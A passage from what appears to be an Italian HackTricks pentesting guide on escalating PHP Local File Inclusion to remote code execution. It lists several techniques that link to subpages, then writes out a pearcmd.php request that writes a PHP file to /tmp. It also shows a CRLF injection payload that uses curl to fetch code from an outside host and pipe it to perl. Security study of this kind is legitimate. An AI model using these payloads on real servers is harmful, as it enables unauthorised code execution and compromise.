```
### Via php filters (no file needed)

Questo [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) spiega che puoi usare **i filtri php per generare contenuti arbitrari** come output. Il che significa fondamentalmente che puoi **generare codice php arbitrario** per l'inclusione **senza doverlo scrivere** in un file.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**Carica** un file che sar√† memorizzato come **temporaneo** in `/tmp`, poi nella **stessa richiesta,** attiva un **segmentation fault**, e poi il **file temporaneo non verr√† eliminato** e puoi cercarlo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

Se hai trovato un **Local File Inclusion** e **Nginx** √® in esecuzione davanti a PHP, potresti essere in grado di ottenere RCE con la seguente tecnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Se hai trovato un **Local File Inclusion** anche se **non hai una sessione** e `session.auto_start` √® `Off`. Se fornisci il **`PHP_SESSION_UPLOAD_PROGRESS`** nei dati **multipart POST**, PHP **abiliter√† la sessione per te**. Potresti abusare di questo per ottenere RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

Se hai trovato un **Local File Inclusion** e il server √® in esecuzione su **Windows**, potresti ottenere RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + URL args

Come [**spiegato in questo post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), lo script `/usr/local/lib/phppearcmd.php` esiste per impostazione predefinita nelle immagini docker php. Inoltre, √® possibile passare argomenti allo script tramite l'URL perch√© √® indicato che se un parametro URL non ha un `=`, dovrebbe essere usato come argomento.

La seguente richiesta crea un file in `/tmp/hello.php` con il contenuto `<?=phpinfo()?>`:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

L'abuso seguente di una vulnerabilit√† CRLF per ottenere RCE (da [**qui**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file\_uploads = on)

Se hai trovato un **Local File Inclusion** e un file che espone **phpinfo()** con file\_uploads = on puoi ottenere RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Se hai trovato un **Local File Inclusion** e **puoi esfiltrare il percorso** del file temporaneo MA il **server** sta **controllando** se il **file da includere ha marcatori PHP**, puoi provare a **bypassare quel controllo** con questa **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

Se puoi abusare del LFI per **caricare file temporanei** e far **bloccarsi** l'esecuzione di PHP, potresti quindi **forzare i nomi dei file per ore** per trovare il file temporaneo:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

Se includi uno dei file `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Devi includere lo stesso due volte per generare quell'errore).

**Non so quanto sia utile, ma potrebbe esserlo.**\
_Anche se causate un errore fatale di PHP, i file temporanei caricati vengono eliminati._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Hacking Insights**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Real-Time Hack News**\
Rimani aggiornato con il mondo dell'hacking in rapida evoluzione attraverso notizie e approfondimenti in tempo reale

**Latest Announcements**\
Rimani informato sulle nuove bug bounty in arrivo e sugli aggiornamenti cruciali della piattaforma

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
